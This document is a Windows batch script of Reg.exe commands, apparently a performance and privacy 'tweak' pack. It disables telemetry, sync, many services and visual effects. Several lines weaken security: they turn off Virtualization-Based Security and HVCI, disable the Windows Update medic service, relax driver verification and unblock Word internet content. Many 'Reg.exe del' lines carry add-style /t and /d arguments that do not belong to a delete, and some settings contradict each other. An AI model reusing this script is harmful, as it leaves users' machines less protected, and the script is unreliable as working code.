Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "accesssolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "olksolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "onenotesolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "pptsolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "projectsolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "publishersolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "visiosolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "wdsolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "xlsolution" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "agave" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "appaddins" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "comaddins" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "templatefiles" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\excel\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\powerpoint\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\word\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "TraceLevelThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype" /v "EnableTracing" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "EnableTracing" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype" /v "WPPFilePath" /t REG_SZ /d "%%SYSTEMDRIVE%%\TEMP\Tracing\WPPMedia" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "WPPFilePath" /t REG_SZ /d "%%SYSTEMDRIVE%%\TEMP\WPPMedia" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\WMDRM" /v "DisableOnline" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Browser" /v "AllowAddressBarDropdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d "5" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\AppSync" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\StartLayout" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Speech_OneCore\Preferences" /v "ModelDownloadAllowed" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "MaxTelemetryAllowed" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechModelUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t "REG_DWORD" /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t "REG_DWORD" /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\ScheduledDiagnostics" /v "EnabledExecution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowCortana" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowTailoredExperiencesWithDiagnosticData" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDebugMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\MicrosoftEdge\TabPreloader" /v "AllowPrelaunch" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\MicrosoftEdge\TabPreloader" /v "AllowTabPreloading" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /v "DefaultApplied" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xbgm" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XboxGipSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\spectrum" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SysMain" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AdobeFlashPlayerUpdateSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ibtsiva" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sshd" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wersvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdatem" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t Reg_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsRunInBackground" /t Reg_DWORD /d "2" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t Reg_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t Reg_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "Composition" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\FTH" /v "Enabled" /t Reg_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Hone" /v "MemoryTweaks" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t Reg_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "HeapDeCommitFreeBlockThreshold" /t REG_DWORD /d "262144" /f
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AutoRestartShell" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "DontVerifyRandomDrivers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "LongPathsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t Reg_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t Reg_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t Reg_SZ /d "1000" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t Reg_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t Reg_SZ /d "1000" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WMPNetworkSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\debugregsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ndu" /v "Start" /d "2" /t REG_DWORD /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /d "3" /t REG_DWORD /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t REG_DWORD /d "3" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f
Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertPropSvc" /v "Start" /t REG_DWORD /d "3" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMftZoneReservation" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisable8dot3NameCreation" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "DontVerifyRandomDrivers" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisableLastAccessUpdate" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "ContigFileAllocSize" /t REG_DWORD /d "64" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d "150000" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnlodelLL" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnlodelLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "ContentDeliveryAllowed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "FeatureManagementEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RemediationRequired" /t REG_DWORD /d "0" /f
